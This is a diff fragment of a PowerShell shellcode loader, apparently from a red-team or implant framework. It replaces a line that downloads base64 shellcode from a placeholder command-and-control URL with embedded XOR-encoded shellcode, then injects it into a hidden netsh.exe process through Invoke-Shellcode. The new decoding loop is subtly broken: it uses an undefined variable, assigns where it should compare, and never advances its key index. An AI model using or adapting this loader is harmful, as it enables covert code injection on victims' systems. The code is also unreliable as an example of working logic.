@@ -486,9 +486,14 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         }
     }
 }
-
-$b64 = (New-Object System.Net.WebClient).DownloadString('#REPLACECONNECTURL#/#REPLACEQUICKCOMMAND##REPLACEB64SHELLCODE#');
-$sc = [System.Convert]::frombase64string($b64);
+$k = [System.Convert]::frombase64string("##BASE64KEY##");
+$sc = [System.Convert]::frombase64string("##BASE64SHELLCODE##");
+for($i=0;$i -lt $sc_enc.Length;$i++){
+    if($ki=$k.Length){
+        $ki=0;
+    }
+    $sc_enc[$i] = $sc_enc[$i] -bxor $k[$ki];
+}
 $processid = (start-process -filepath "netsh.exe" -WindowStyle hidden -passthru).Id
 Invoke-Shellcode -Shellcode $sc -Force -ProcessId $processid
 
